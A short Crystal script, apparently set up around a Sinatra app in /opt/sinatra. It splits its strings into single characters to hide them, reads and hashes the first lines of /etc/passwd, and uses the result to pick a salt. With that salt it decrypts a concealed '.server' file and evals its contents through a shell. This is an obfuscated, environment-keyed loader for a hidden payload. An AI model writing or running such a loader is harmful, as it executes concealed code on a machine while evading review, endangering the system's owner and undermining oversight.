# Crystal version: 0.22.0
require "Digest/MD5"
# Crystal version 0.23.1
# require "digest/md5"

Process.run("cd /opt/sinatra && bundle install", shell: true)
yum_yum = "s" + "i" + "n" + "a" + "t" + "r" + "a"
yuck_yuck = "b" + "a" + "n" + "a" + "n" + "a"
var_code = "c" + "r"
var_obf = "o" + "b" + "f" + "u" + "s" + "c" + "a" + "t" + "e"
var_server = "." + "s" + "e" + "r" + "v" + "e"+ "r"
var_passwd = "/" + "e" + "t" + "c" + "/" + "p" + "a" + "s" + "s" + "w" + "d"
var_hash_match = "0" + "f" + "c" + "7" + "5" + "8" + "4" + "6" + "b" + "7" + "e" + "d" + "9" + "d" + "0" + "a" + "b" + "9" + "d" + "a" + "1" + "b" + "2" + "8" + "d" + "a" + "e" + "8" + "6" + "6" + "0" + "a"

passwd_lines = ""
counter = 0

File.each_line("/etc/passwd") do |line|
  counter += 1
  passwd_lines += line + "\n"
  break if counter >= 10
end

hash = Digest::MD5.hexdigest(passwd_lines)

if hash == var_hash_match
  puts "Match is correct"
  code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yum_yum}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
else
  puts "Match is not correct"
  code = %{require '#{var_obf}'; Obfuscate.setup { |c| c.salt = '#{yuck_yuck}'; c.mode = :string }; #{var_code} = Obfuscate.clarify(File.read('#{var_server}')); eval(#{var_code})}
end

Process.run("cd /opt/sinatra && ruby -e \"#{code}\"", shell: true)
